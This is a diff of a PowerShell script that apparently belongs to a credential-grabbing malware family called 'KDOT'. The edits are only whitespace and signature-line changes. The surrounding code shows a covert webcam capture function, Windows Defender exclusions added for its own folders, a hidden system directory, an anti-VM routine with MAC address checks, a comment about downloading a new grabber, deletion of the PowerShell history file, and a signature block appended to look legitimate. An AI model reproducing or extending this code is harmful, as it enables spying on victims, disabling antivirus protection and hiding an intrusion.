@@ -663,8 +663,7 @@ function Get-WebCamImage {
 "@ 
     Add-Type -AssemblyName System.Drawing  
     $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
-    Where-Object { $_.FormatDescription -eq "JPEG" }  
-        
+    Where-Object { $_.FormatDescription -eq "JPEG" }       
     Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
     try {
         #region Import the Assemblies 
@@ -672,7 +671,6 @@ function Get-WebCamImage {
         [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
         #endregion 
         $picCapture = New-Object System.Windows.Forms.PictureBox 
-        
         try {
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
         } catch {
@@ -702,11 +700,9 @@ function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
     New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
-    
     # Hidden Directory
     $KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
-    $KDOT_DIR.attributes="Hidden","System"
-    
+    $KDOT_DIR.attributes="Hidden","System" 
     #$origin = $PSCommandPath
     #Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     #download new grabber
@@ -771,7 +767,6 @@ function Invoke-ANTITOTAL {
     }
     Invoke-ANTIVM
 }
-
 
 function Search-Mac ($mac_addresses) {
     $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
@@ -906,7 +901,6 @@ if (CHECK_IF_ADMIN -eq $true) {
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
-
 # Added Digital Signature 
 
 # SIG # Begin signature block
@@ -1031,4 +1025,5 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # 7h1oxYvsL3MjzicqswGC87CbgKmuFNTSr1F0ujwMleIZlrWHR9jmcKcq6Dh32KLJ
 # /d1aUVbobDOqQKTlEAHtxXMWG0+X2o4lFfuGAHCCaMI7+iEb4e8O7i2aoUk1Fxy8
 # tz7P29qBnor859PuPbCAef3jdrHkOAFs3LKbcpQJ6jUpGdswthQ=
-# SIG # End signature block
+# SIG 
+# End signature block
